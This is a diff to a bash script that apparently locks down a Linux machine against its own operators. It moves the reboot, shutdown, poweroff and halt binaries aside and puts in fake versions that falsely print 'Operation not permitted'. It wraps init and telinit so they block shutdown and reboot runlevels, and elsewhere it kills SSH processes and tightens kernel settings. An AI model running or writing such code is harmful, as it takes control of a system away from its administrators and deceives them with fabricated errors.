@@ -483,23 +483,17 @@ apply_kernel_restrictions() {
     
     echo -e "${GREEN}Applying kernel-level restrictions...${NC}"
     
-    if [ -f /proc/sys/kernel/modules_disabled ]; then
-        echo 1 > /proc/sys/kernel/modules_disabled 2>/dev/null
-    fi
-    
     if [ -f /proc/sys/kernel/sysrq ]; then
         echo 0 > /proc/sys/kernel/sysrq 2>/dev/null
     fi
     
     if [ -f /proc/sys/kernel/pty/max ]; then
-        echo 2 > /proc/sys/kernel/pty/max 2>/dev/null
+        echo 32 > /proc/sys/kernel/pty/max 2>/dev/null
     fi
     
     if [ -f /proc/sys/kernel/core_pattern ]; then
         echo "|/bin/false" > /proc/sys/kernel/core_pattern 2>/dev/null
     fi
-    
-    swapoff -a 2>/dev/null
     
     echo -e "${GREEN}Kernel restrictions applied [DONE]${NC}"
 }
@@ -1039,7 +1033,7 @@ show_progress $! "Killing SSH processes"
 
 echo -e "${GREEN}Implementing MAXIMUM anti-shutdown protection...${NC}"
 
-for cmd in reboot shutdown poweroff halt init telinit systemctl; do
+for cmd in reboot shutdown poweroff halt; do
     for path in /sbin/$cmd /usr/sbin/$cmd /bin/$cmd /usr/bin/$cmd; do
         if [ -x "$path" ]; then
             mv "$path" "${path}.disabled" 2>/dev/null
@@ -1052,6 +1046,20 @@ echo "Operation not permitted"
 exit 1
 FAKE_CMD
     chmod +x /usr/local/bin/$cmd 2>/dev/null
+done
+
+for cmd in init telinit; do
+    if [ -f "/sbin/$cmd" ]; then
+        cat > /usr/local/bin/$cmd << 'INIT_BLOCK'
+#!/bin/sh
+if [ "$1" = "0" ] || [ "$1" = "6" ]; then
+    echo "Operation not permitted"
+    exit 1
+fi
+exec /sbin/$cmd.real "$@" 2>/dev/null || exec /sbin/$cmd "$@"
+INIT_BLOCK
+        chmod +x /usr/local/bin/$cmd 2>/dev/null
+    fi
 done
 
 
